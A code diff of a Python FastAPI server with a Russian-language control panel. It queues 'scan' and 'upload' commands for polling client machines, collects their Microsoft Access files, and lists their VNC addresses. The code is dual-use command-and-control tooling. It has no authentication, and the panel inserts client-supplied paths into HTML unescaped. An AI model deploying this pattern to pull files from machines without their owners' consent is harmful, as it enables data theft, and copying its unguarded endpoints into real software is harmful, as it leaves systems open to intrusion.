@@ -16,10 +16,10 @@ uploaded_files_dir = "uploaded_files"
 os.makedirs(uploaded_files_dir, exist_ok=True)
 
 # Хранилища в памяти
-pending_commands: Dict[str, List[dict]] = {}     # команды для клиентов
-client_files: Dict[str, List[dict]] = {}         # списки файлов от клиентов
-uploaded_files_metadata: List[dict] = []         # метаданные загруженных файлов
-clients_registry: Dict[str, dict] = {}           # client_id → {ip, vnc_port, vnc_status, last_seen}
+pending_commands: Dict[str, List[dict]] = {}
+client_files: Dict[str, List[dict]] = {}
+uploaded_files_metadata: List[dict] = []
+clients_registry: Dict[str, dict] = {}
 
 # Модели
 class ScanCommand(BaseModel):
@@ -38,43 +38,29 @@ class ClientStatus(BaseModel):
     client_id: str
     ip: str
     vnc_port: int
-    vnc_status: str  # "running" / "stopped"
+    vnc_status: str
 
-# 1. Запросить сканирование файлов
+# Эндпоинты
 @app.post("/command/scan", response_model=CommandResponse)
 async def create_scan_command(cmd: ScanCommand):
     command_id = str(uuid.uuid4())
-    new_command = {
-        "command_id": command_id,
-        "type": "scan",
-        "status": "pending"
-    }
+    new_command = {"command_id": command_id, "type": "scan", "status": "pending"}
     pending_commands.setdefault(cmd.client_id, []).append(new_command)
-    print(f"[+] SCAN команда для {cmd.client_id}: {command_id}")
     return CommandResponse(command_id=command_id, type="scan", status="pending")
 
-# 2. Запросить загрузку файла
 @app.post("/command/upload", response_model=CommandResponse)
 async def create_upload_command(cmd: UploadCommand):
     command_id = str(uuid.uuid4())
-    new_command = {
-        "command_id": command_id,
-        "type": "upload",
-        "filepath": cmd.filepath,
-        "status": "pending"
-    }
+    new_command = {"command_id": command_id, "type": "upload", "filepath": cmd.filepath, "status": "pending"}
     pending_commands.setdefault(cmd.client_id, []).append(new_command)
-    print(f"[+] UPLOAD команда для {cmd.client_id}: {cmd.filepath}")
     return CommandResponse(command_id=command_id, type="upload", status="pending")
 
-# 3. Получить команды для клиента
 @app.get("/commands/{client_id}")
 async def get_commands(client_id: str):
     commands = pending_commands.get(client_id, [])
     pending = [cmd for cmd in commands if cmd["status"] == "pending"]
     return {"commands": pending}
 
-# 4. Клиент отправляет список найденных файлов
 @app.post("/files/report")
 async def report_files(client_id: str = Form(...), files_json: str = Form(...)):
     try:
@@ -82,31 +68,23 @@ async def report_files(client_id: str = Form(...), files_json: str = Form(...)):
         client_files[client_id] = [
             {"filepath": f, "reported_at": datetime.now().isoformat()} for f in files_list
         ]
-
         if client_id in pending_commands:
             for cmd in pending_commands[client_id]:
                 if cmd["type"] == "scan" and cmd["status"] == "pending":
                     cmd["status"] = "completed"
-                    cmd["completed_at"] = datetime.now().isoformat()
-                    cmd["file_count"] = len(files_list)
                     break
-
-        print(f"[+] Клиент {client_id} прислал {len(files_list)} файлов")
         return {"status": "success", "count": len(files_list)}
     except Exception as e:
         raise HTTPException(status_code=400, detail=f"Invalid JSON: {e}")
 
-# 5. Получить список файлов клиента
 @app.get("/client/{client_id}/files")
 async def get_client_files(client_id: str):
     return {"client_id": client_id, "files": client_files.get(client_id, [])}
 
-# 6. API: получить список всех клиентов (с IP и статусом VNC)
 @app.get("/api/clients")
 async def get_all_clients():
     return {"clients": clients_registry}
 
-# 7. Клиент отправляет свой IP и статус VNC
 @app.post("/client/status")
 async def receive_client_status(status: ClientStatus):
     clients_registry[status.client_id] = {
@@ -117,12 +95,10 @@ async def receive_client_status(status: ClientStatus):
     }
     return {"status": "ok"}
 
-# 8. API: получить список загруженных файлов
 @app.get("/api/downloaded-files")
 async def get_downloaded_files():
     return {"files": uploaded_files_metadata}
 
-# 9. Загрузка файла от клиента
 @app.post("/upload/")
 async def upload_file(
     command_id: str = Form(...),
@@ -131,7 +107,6 @@ async def upload_file(
 ):
     commands = pending_commands.get(client_id, [])
     command = next((c for c in commands if c["command_id"] == command_id), None)
-
     if not command:
         raise HTTPException(status_code=404, detail="Command not found")
 
@@ -157,176 +132,217 @@ async def upload_file(
         "size": len(content),
         "uploaded_at": command["completed_at"]
     })
+    return {"status": "success", "command_id": command_id, "message": "Файл успешно загружен"}
 
-    print(f"[+] Файл сохранён: {save_path}")
-    return {
-        "status": "success",
-        "command_id": command_id,
-        "message": "Файл успешно загружен на сервер"
-    }
-
-# 10. Скачать файл
 @app.get("/download/{command_id}")
 async def download_file(command_id: str):
     file_record = next((f for f in uploaded_files_metadata if f["command_id"] == command_id), None)
-
     if not file_record or not os.path.exists(file_record["saved_path"]):
         raise HTTPException(status_code=404, detail="Файл не найден")
-
     return FileResponse(
         path=file_record["saved_path"],
         filename=file_record["filename"],
         media_type="application/octet-stream"
     )
 
-# 11. Главная страница
+# Главная страница
 @app.get("/", response_class=HTMLResponse)
 async def main_page():
     return """
     <html>
-        <head><title>📁 Access File Transfer</title>
-        <style>
-            body { font-family: Arial; margin: 40px; background: #f5f5f5; }
-            .container { max-width: 900px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-            input, button { padding: 10px; font-size: 16px; margin: 5px; }
-            .section { margin-top: 40px; }
-            .file-item { padding: 15px; border: 1px solid #eee; margin: 10px 0; border-radius: 5px; display: flex; justify-content: space-between; align-items: center; }
-            .file-info { flex: 1; }
-            .file-name { font-weight: bold; word-break: break-all; }
-            .file-meta { color: #666; font-size: 14px; }
-            .btn { padding: 8px 15px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; }
-            .btn:hover { background: #218838; }
-            .btn-upload { background: #007bff; }
-            .btn-upload:hover { background: #0056b3; }
-            .vnc-ok { color: green; }
-            .vnc-down { color: red; }
-        </style>
+        <head>
+            <title>📁 Access File Transfer — Центр управления</title>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background: #f9f9f9; }
+                .container { max-width: 1000px; margin: 0 auto; }
+                h1 { text-align: center; color: #2c3e50; }
+                .client-card {
+                    background: white;
+                    border: 1px solid #ddd;
+                    border-radius: 8px;
+                    padding: 16px;
+                    margin: 12px 0;
+                    box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+                }
+                .client-card h3 {
+                    margin-top: 0;
+                    color: #2980b9;
+                    display: flex;
+                    align-items: center;
+                }
+                .vnc-address {
+                    background: #f1f1f1;
+                    padding: 6px 10px;
+                    border-radius: 4px;
+                    font-family: monospace;
+                    display: inline-block;
+                    margin-right: 8px;
+                }
+                .btn {
+                    padding: 6px 12px;
+                    margin: 4px;
+                    border: none;
+                    border-radius: 4px;
+                    cursor: pointer;
+                    font-size: 14px;
+                }
+                .btn-primary { background: #3498db; color: white; }
+                .btn-success { background: #2ecc71; color: white; }
+                .btn-download { background: #27ae60; color: white; }
+                .files-section {
+                    margin-top: 12px;
+                    padding-top: 12px;
+                    border-top: 1px dashed #eee;
+                }
+                .file-item {
+                    padding: 8px 0;
+                    border-bottom: 1px solid #f5f5f5;
+                }
+                .file-path {
+                    font-family: monospace;
+                    font-size: 14px;
+                    word-break: break-all;
+                }
+                .file-meta {
+                    font-size: 12px;
+                    color: #7f8c8d;
+                }
+                .status-ok { color: #27ae60; }
+                .status-down { color: #e74c3c; }
+            </style>
         </head>
         <body>
             <div class="container">
-                <h1>📁 Access File Transfer</h1>
-                <div>
-                    <input type="text" id="clientId" placeholder="ID клиента (например: client_office_01)" value="client_office_01" />
-                    <button onclick="scanFiles()">🔍 Запросить список файлов Access</button>
-                </div>
+                <h1>📁 Access File Transfer — Центр управления</h1>
+                <div id="clientsList"></div>
 
-                <div id="clientsInfo" class="section"></div>
-                <div id="filesContainer" class="section"></div>
-
-                <div class="section">
+                <div class="client-card">
                     <h3>⬇️ Загруженные файлы</h3>
                     <div id="downloadedFilesContainer">
-                        <p>Здесь появятся файлы после загрузки.</p>
+                        <p>Нет загруженных файлов.</p>
                     </div>
                 </div>
             </div>
 
             <script>
-                async function scanFiles() {
-                    const clientId = document.getElementById('clientId').value;
-                    const res = await fetch('/command/scan', {
+                async function loadAllClients() {
+                    const res = await fetch('/api/clients');
+                    const data = await res.json();
+                    const container = document.getElementById('clientsList');
+                    
+                    if (Object.keys(data.clients).length === 0) {
+                        container.innerHTML = '<p style="text-align:center; color:#7f8c8d;">Нет подключённых клиентов</p>';
+                        return;
+                    }
+
+                    container.innerHTML = '';
+                    for (const [clientId, info] of Object.entries(data.clients)) {
+                        const vncAddr = `${info.ip}:${info.vnc_port}`;
+                        const statusClass = info.vnc_status === "running" ? "status-ok" : "status-down";
+                        const statusText = info.vnc_status === "running" ? "✅ VNC работает" : "❌ VNC не отвечает";
+
+                        const div = document.createElement('div');
+                        div.className = 'client-card';
+                        div.innerHTML = `
+                            <h3>🖥️ ${clientId}</h3>
+                            <p>
+                                <strong>IP для VNC:</strong> 
+                                <span class="vnc-address" id="vnc-${clientId}">${vncAddr}</span>
+                                <button class="btn btn-primary" onclick="copyVNC('${clientId}')">📋 Копировать</button>
+                            </p>
+                            <p><span class="${statusClass}">${statusText}</span></p>
+                            <button class="btn btn-success" onclick="showFiles('${clientId}')">📂 Показать файлы</button>
+                            <div id="files-${clientId}" class="files-section" style="display:none;"></div>
+                        `;
+                        container.appendChild(div);
+                    }
+                }
+
+                function copyVNC(clientId) {
+                    const el = document.getElementById(`vnc-${clientId}`);
+                    if (el) {
+                        navigator.clipboard.writeText(el.innerText).then(() => {
+                            alert(`Скопировано: ${el.innerText}`);
+                        }).catch(() => {
+                            alert('Не удалось скопировать. Выделите и скопируйте вручную.');
+                        });
+                    }
+                }
+
+                async function showFiles(clientId) {
+                    const filesDiv = document.getElementById(`files-${clientId}`);
+                    filesDiv.style.display = 'block';
+
+                    const res = await fetch(`/client/${clientId}/files`);
+                    const data = await res.json();
+
+                    if (data.files.length === 0) {
+                        filesDiv.innerHTML = `
+                            <p>Файлов пока нет.</p>
+                            <button class="btn btn-primary" onclick="requestScan('${clientId}')">🔍 Запросить список файлов Access</button>
+                        `;
+                    } else {
+                        filesDiv.innerHTML = data.files.map(f => `
+                            <div class="file-item">
+                                <div class="file-path">${f.filepath}</div>
+                                <div class="file-meta">Найден: ${new Date(f.reported_at).toLocaleString()}</div>
+                                <button class="btn btn-success" onclick="uploadFile('${clientId}', '${encodeURIComponent(f.filepath)}')" style="margin-top:6px;">
+                                    📤 Загрузить на сервер
+                                </button>
+                            </div>
+                        `).join('');
+                    }
+                }
+
+                async function requestScan(clientId) {
+                    await fetch('/command/scan', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({client_id: clientId})
                     });
-                    const data = await res.json();
-                    alert('✅ Команда сканирования отправлена: ' + data.command_id);
-                    loadFiles();
-                }
-
-                async function loadClientsInfo() {
-                    const clientId = document.getElementById('clientId').value;
-                    const res = await fetch('/api/clients');
-                    const allClients = await res.json();
-                    const clientData = allClients.clients[clientId];
-                    const container = document.getElementById('clientsInfo');
-
-                    if (clientData) {
-                        const vncStatus = clientData.vnc_status === "running" 
-                            ? '<span class="vnc-ok">✅ VNC работает</span>' 
-                            : '<span class="vnc-down">❌ VNC не отвечает</span>';
-                        container.innerHTML = `
-                            <h3>📡 Информация о клиенте: ${clientId}</h3>
-                            <p><strong>IP:</strong> ${clientData.ip} | <strong>Порт VNC:</strong> ${clientData.vnc_port}</p>
-                            <p>${vncStatus}</p>
-                            <button class="btn btn-upload" onclick="connectVNC('${clientData.ip}', ${clientData.vnc_port})">
-                                🖥️ Подключиться по VNC
-                            </button>
-                        `;
-                    } else {
-                        container.innerHTML = `
-                            <h3>📡 Информация о клиенте: ${clientId}</h3>
-                            <p>Клиент ещё не отправил свой IP. Убедитесь, что клиент запущен.</p>
-                        `;
-                    }
-                }
-
-                function connectVNC(ip, port) {
-                    window.location.href = 'vnc://' + ip + ':' + port;
-                }
-
-                async function loadFiles() {
-                    const clientId = document.getElementById('clientId').value;
-                    const res = await fetch('/client/' + clientId + '/files');
-                    const data = await res.json();
-
-                    const container = document.getElementById('filesContainer');
-                    container.innerHTML = `
-                        <h3>📁 Файлы клиента: ${clientId}</h3>
-                        ${data.files.length ? data.files.map(f => `
-                            <div class="file-item">
-                                <div class="file-info">
-                                    <div class="file-name">${f.filepath}</div>
-                                    <div class="file-meta">Найден: ${new Date(f.reported_at).toLocaleString()}</div>
-                                </div>
-                                <button class="btn btn-upload" onclick="uploadFile('${clientId}', '${encodeURIComponent(f.filepath)}')">📤 Загрузить на сервер</button>
-                            </div>
-                        `).join('') : '<p>Файлов пока нет. Нажмите "Запросить", если ещё не делали.</p>'}
-                    `;
+                    alert('Команда на поиск файлов отправлена. Обновление через 6 сек...');
+                    setTimeout(() => showFiles(clientId), 6000);
                 }
 
                 async function uploadFile(clientId, filepath) {
-                    if (!confirm("Вы уверены, что хотите загрузить этот файл на сервер?")) return;
-
-                    const res = await fetch('/command/upload', {
+                    if (!confirm("Загрузить этот файл на сервер?")) return;
+                    await fetch('/command/upload', {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({client_id: clientId, filepath: decodeURIComponent(filepath)})
                     });
-                    const data = await res.json();
-                    alert(data.message || "Команда загрузки создана.");
+                    alert("Команда загрузки создана.");
                     loadDownloadedFiles();
                 }
 
                 async function loadDownloadedFiles() {
                     const res = await fetch('/api/downloaded-files');
                     const data = await res.json();
-
                     const container = document.getElementById('downloadedFilesContainer');
-                    container.innerHTML = `
-                        ${data.files.length ? data.files.map(f => `
+                    if (data.files.length === 0) {
+                        container.innerHTML = '<p>Нет загруженных файлов.</p>';
+                    } else {
+                        container.innerHTML = data.files.map(f => `
                             <div class="file-item">
-                                <div class="file-info">
-                                    <div class="file-name">${f.filename} (${(f.size / 1024).toFixed(1)} КБ)</div>
-                                    <div class="file-meta">Клиент: ${f.client_id} | ${new Date(f.uploaded_at).toLocaleString()}</div>
-                                </div>
-                                <button class="btn" onclick="location.href='/download/${f.command_id}'">⬇️ Скачать на компьютер</button>
+                                <div><strong>${f.filename}</strong> (${(f.size / 1024).toFixed(1)} КБ)</div>
+                                <div class="file-meta">С компьютера: ${f.client_id} | ${new Date(f.uploaded_at).toLocaleString()}</div>
+                                <button class="btn btn-download" onclick="location.href='/download/${f.command_id}'" style="margin-top:6px;">
+                                    ⬇️ Скачать
+                                </button>
                             </div>
-                        `).join('') : '<p>Нет загруженных файлов.</p>'}
-                    `;
+                        `).join('');
+                    }
                 }
 
-                // Загружаем при открытии
-                loadClientsInfo();
-                loadFiles();
+                // Загрузка при старте
+                loadAllClients();
                 loadDownloadedFiles();
 
-                // Автообновление каждые 10 сек
+                // Автообновление каждые 12 сек
                 setInterval(() => {
-                    loadClientsInfo();
-                    loadFiles();
+                    loadAllClients();
                     loadDownloadedFiles();
-                }, 10000);
+                }, 12000);
             </script>
         </body>
     </html>
